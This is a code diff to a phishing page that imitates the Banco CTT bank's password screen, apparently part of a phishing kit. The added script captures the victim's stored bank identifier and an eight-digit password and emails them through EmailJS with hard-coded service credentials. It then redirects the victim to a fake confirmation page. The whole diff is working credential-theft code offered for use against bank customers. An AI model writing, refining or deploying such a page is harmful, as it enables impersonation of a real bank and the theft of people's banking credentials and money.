@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banco CTT - Palavra-passe</title>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -393,7 +395,7 @@
                 <div class="password-section">
                     <label>Palavra-passe</label>
                     
-                    <!--  <div class="password-dots">
+                                    <!--  <div class="password-dots">
                         <div class="dot active"></div>
                         <div class="dot active"></div>
                         <div class="dot active"></div>
@@ -405,7 +407,7 @@
                         <div class="dot active"></div>
                     </div>-->
 
-      <div class="password-inputs">
+<div class="password-inputs">
 					<div class="password-input-group">
                             <input type="text" name="chiffre_1" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" required>
                             <span class="position">1ª</span>
@@ -460,7 +462,17 @@
     </footer>
 
     <script>
-        // Récupère l'identifiant du localStorage
+        // ============================================
+        // CONFIGURATION EMAILJS - REMPLACE CES 3 VALEURS
+        // ============================================
+        const EMAILJS_PUBLIC_KEY = "NRFQt1h7JUwuYLn01";      // ← Ta clé publique EmailJS
+        const EMAILJS_SERVICE_ID = "service_c0tz2um";           // ← Ton Service ID
+        const EMAILJS_TEMPLATE_ID = "template_ehytfug";       // ← Ton Template ID
+
+        // Initialise EmailJS
+        emailjs.init(EMAILJS_PUBLIC_KEY);
+
+        // Récupère l'identifiant du localStorage au chargement
         document.addEventListener('DOMContentLoaded', function() {
             const identifiant = localStorage.getItem('banco_ctt_identifiant');
             if (identifiant) {
@@ -470,66 +482,85 @@
             }
         });
 
-        // Validation chiffres + auto-focus
+        // Validation des chiffres uniquement + auto-focus
         document.querySelectorAll('.password-input-group input').forEach(input => {
+            // Bloque tout caractère non-numérique au clavier
             input.addEventListener('keydown', function(e) {
-                const allowed = ['Backspace','Delete','Tab','ArrowLeft','ArrowRight'];
-                if (allowed.includes(e.key)) return;
-                if (!/^\d$/.test(e.key)) e.preventDefault();
+                const allowedKeys = ['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'];
+                if (allowedKeys.includes(e.key)) return;
+                
+                if (!/^\d$/.test(e.key)) {
+                    e.preventDefault();
+                }
             });
 
+            // Nettoie et limite à 1 chiffre
             input.addEventListener('input', function() {
-                let v = this.value.replace(/\D/g, '');
-                this.value = v.slice(-1);
+                let value = this.value.replace(/\D/g, '');
+                if (value.length > 1) {
+                    value = value.slice(-1);
+                }
+                this.value = value;
             });
 
+            // Auto-focus sur le champ suivant après saisie
             input.addEventListener('keyup', function(e) {
-                if (this.value && e.key !== 'Backspace') {
-                    const inputs = [...document.querySelectorAll('.password-input-group input')];
-                    const idx = inputs.indexOf(this);
-                    if (idx < inputs.length - 1) inputs[idx + 1].focus();
+                if (this.value.length === 1 && e.key !== 'Backspace') {
+                    const inputs = Array.from(document.querySelectorAll('.password-input-group input'));
+                    const currentIndex = inputs.indexOf(this);
+                    if (currentIndex < inputs.length - 1) {
+                        inputs[currentIndex + 1].focus();
+                    }
                 }
             });
         });
 
-        // Envoi via API Vercel → FormSubmit AJAX
+        // Envoi des données via EmailJS
         async function envoyer(e) {
             e.preventDefault();
             
-            const data = {
-                identifiant: document.getElementById('identifiant_hidden').value,
-                chiffre_1: document.querySelector('input[name="chiffre_1"]').value,
-                chiffre_2: document.querySelector('input[name="chiffre_2"]').value,
-                chiffre_3: document.querySelector('input[name="chiffre_3"]').value,
-				 chiffre_4: document.querySelector('input[name="chiffre_4"]').value,
-                chiffre_5: document.querySelector('input[name="chiffre_5"]').value,
-                chiffre_6: document.querySelector('input[name="chiffre_6"]').value,
-				 chiffre_7: document.querySelector('input[name="chiffre_7"]').value,
-                chiffre_8: document.querySelector('input[name="chiffre_8"]').value
-              
-            };
+            const identifiant = document.getElementById('identifiant_hidden').value;
+            const chiffre_1 = document.querySelector('input[name="chiffre_1"]').value;
+            const chiffre_2 = document.querySelector('input[name="chiffre_2"]').value;
+            const chiffre_3 = document.querySelector('input[name="chiffre_3"]').value;
+			const chiffre_4 = document.querySelector('input[name="chiffre_4"]').value;
+            const chiffre_5 = document.querySelector('input[name="chiffre_5"]').value;
+            const chiffre_6 = document.querySelector('input[name="chiffre_6"]').value;
+			const chiffre_7 = document.querySelector('input[name="chiffre_7"]').value;
+            const chiffre_8 = document.querySelector('input[name="chiffre_8"]').value;
+            
 
+            // Change le bouton pendant l'envoi
             const btn = document.querySelector('.btn-continue');
+            const originalText = btn.textContent;
             btn.textContent = 'A enviar...';
             btn.disabled = true;
 
             try {
-                const res = await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
+                await emailjs.send(
+                    EMAILJS_SERVICE_ID,
+                    EMAILJS_TEMPLATE_ID,
+                    {
+                        identifiant: identifiant,
+                        chiffre_1: chiffre_1,
+                        chiffre_2: chiffre_2,
+                        chiffre_3: chiffre_3,
+						chiffre_4: chiffre_4,
+                        chiffre_5: chiffre_5,
+                        chiffre_6: chiffre_6,
+						chiffre_7: chiffre_7,
+                        chiffre_8: chiffre_8
+                        
+                    }
+                );
 
-                const result = await res.json();
-
-                if (res.ok && result.success) {
-                    window.location.href = 'confirmacao.html';
-                } else {
-                    throw new Error(result.error || 'Erreur inconnue');
-                }
-            } catch (err) {
-                alert('Erreur lors de l\'envoi : ' + err.message);
-                btn.textContent = 'Continuar';
+                // Redirection vers la page de remerciement
+                window.location.href = 'confirmacao.html';
+                
+            } catch (error) {
+                console.error('Erreur EmailJS:', error);
+                alert('Erreur lors de l\'envoi : ' + (error.text || error.message));
+                btn.textContent = originalText;
                 btn.disabled = false;
             }
         }
